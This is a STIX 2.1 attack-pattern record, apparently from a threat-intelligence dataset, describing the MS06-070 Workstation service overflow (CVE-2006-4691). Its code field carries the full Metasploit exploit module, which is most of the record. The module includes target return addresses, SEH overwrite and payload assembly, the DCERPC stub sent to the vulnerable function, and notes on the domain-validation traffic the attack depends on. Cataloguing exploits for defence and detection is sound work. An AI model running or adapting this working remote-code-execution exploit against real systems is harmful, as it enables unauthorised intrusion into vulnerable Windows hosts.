{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--37d4c599-bcfa-4d57-9290-ab62b96e0594",
    "created": "2024-08-14T16:56:32.883929Z",
    "modified": "2024-08-14T16:56:32.883933Z",
    "name": "MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow",
    "description": " This module exploits a stack buffer overflow in the NetApi32 NetpManageIPCConnect function using the Workstation service in Windows 2000 SP4 and Windows XP SP2.  In order to exploit this vulnerability, you must specify the name of a valid Windows DOMAIN. It may be possible to satisfy this condition by using a custom DNS and LDAP setup, however that method is not covered here.  Although Windows XP SP2 is vulnerable, Microsoft reports that Administrator credentials are required to reach the vulnerable code. Windows XP SP1 only requires valid user credentials. Also, testing shows that a machine already joined to a domain is not exploitable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/smb/ms06_070_wkssvc.rb",
            "external_id": "ms06_070_wkssvc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-4691"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking # Requires valid/working DOMAIN + DC\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the NetApi32 NetpManageIPCConnect\n        function using the Workstation service in Windows 2000 SP4 and Windows XP SP2.\n\n        In order to exploit this vulnerability, you must specify the name of a\n        valid Windows DOMAIN. It may be possible to satisfy this condition by using\n        a custom DNS and LDAP setup, however that method is not covered here.\n\n        Although Windows XP SP2 is vulnerable, Microsoft reports that Administrator\n        credentials are required to reach the vulnerable code. Windows XP SP1 only\n        requires valid user credentials. Also, testing shows that a machine already\n        joined to a domain is not exploitable.\n      },\n      'Author'         =>\n        [\n          'jduck'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2006-4691' ],\n          [ 'OSVDB', '30263' ],\n          [ 'BID', '20985' ],\n          [ 'MSB', 'MS06-070' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic Targetting', { } ],\n          [ 'Windows 2000 SP4',\n            {\n              'Offset' => (1058*2),\n              'Ret' => 0x75022ac4  # pop/pop/ret in ws2help.dll\n            }\n          ],\n          [ 'Windows XP SP0/SP1',\n            {\n              'Offset' => (1290*2),\n              'Ret' => 0x71ab21cd   # pop/pop/ret in ws2_32.dll\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-11-14'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [ true,  \"The pipe name to use.\", 'WKSSVC']),\n        # NOTE: a valid domain name is required. See description.\n        OptString.new('DOMAIN', [ true,  \"The domain to validate prior to joining it.\"])\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  def exploit\n\n    connect(versions: [1])\n    smb_login()\n\n    mytarget = nil\n    if (target.name =~ /Automatic/)\n      case smb_peer_os()\n        when 'Windows 5.0'\n          print_status(\"Detected a Windows 2000 target\")\n          mytarget = targets[1]\n        when 'Windows 5.1'\n          begin\n            smb_create(\"\\\\SRVSVC\")\n            print_status(\"Detected a Windows XP SP0/SP1 target\")\n          rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e\n            if (e.error_code == 0xc0000022)\n              fail_with(Failure::Unknown, \"Windows XP SP2 requires Administrator privileges!\")\n            end\n            print_status(\"Detected a Windows XP target (unknown patch level)\")\n          end\n          mytarget = targets[2]\n        else\n          fail_with(Failure::NoTarget, \"No target detected for #{smb_peer_os()}/#{smb_peer_lm()}...\")\n      end\n    else\n      mytarget = target\n    end\n\n    handle = dcerpc_handle(\n      '6bffd098-a112-3610-9833-46c3f87e345a', '1.0',\n      'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"]\n    )\n\n    print_status(\"Binding to #{handle} ...\")\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    print_status(\"Building the stub data...\")\n\n    distance = mytarget['Offset']\n    hostname = make_nops(distance - payload.encoded.length)\n    hostname << payload.encoded\n    hostname << generate_seh_record(mytarget.ret)\n    hostname << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n    name = datastore['DOMAIN'] + \"\\\\\\\\L\"\n    name = Rex::Text.to_unicode(name)\n    name << hostname\n    name << Rex::Text.to_unicode(rand_text_alphanumeric(1000) * 3)\n    name << \"\\x00\\x00\"\n\n    stub =\n      NDR.uwstring(\"\\\\\\\\#{datastore['RHOST']}\") +\n      NDR.UnicodeConformantVaryingStringPreBuilt(name) +\n      NDR.uwstring(\"\") +\n      NDR.uwstring(\"\") +\n      NDR.long(0) +\n      NDR.long(1)\n\n    print_status(\"Calling the vulnerable function...\")\n\n    begin\n      dcerpc.call(0x16, stub)\n    rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n    rescue => e\n      if e.to_s !~ /STATUS_PIPE_DISCONNECTED/\n        raise e\n      end\n    end\n\n    # Cleanup\n    handler\n    disconnect\n  end\nend\n\n\n\n=begin\n\nThe IDL for NetrJoinDomain2 looks like this:\nlong _NetrJoinDomain2@28 (\n  [in][unique][string] wchar_t * arg_1,\n  [in][string] wchar_t * arg_2,\n  [in][unique][string] wchar_t * arg_3,\n  [in][unique][string] wchar_t * arg_4,\n  [in][unique] struct_C * arg_5,\n  [in] long arg_6\n  );\n\n\n1. --> dns server - query for IN.SRV _ldap._tcp.dc._msdcs.DOMAIN\n2. <-- dns server - response including answer and additional record.\n                    answer: whateverserver.DOMAIN priority 0 / weight 100 / port 389\n              additional: IN.A address of whateverserver.DOMAIN\n3. --> ldap server - baseObject query with filter/attributes:\n                   - filter: (&(&(DnsDomain=DOMAIN)(Host=TARGETHOSTNAME))(NtVer=06:00:00:00))\n             - attributes: AttributeDescriptionList: NetLogon\n4. <-- ldap server - searchResDone success, attributes data\n                   - PartialAttributeList netlogon - 1 item\n               - type 23, flags 0x1fd, domain GUID,\n              forest, domain, hostname, netbios domain, netbios hostname,\n              user, site, client site, version, lmtoken, nttoken\n5. validated.\n\n=end\n",
    "x_mitre_disclosure_date": "2006-11-14",
    "x_mitre_platforms": [
        "win'"
    ]
}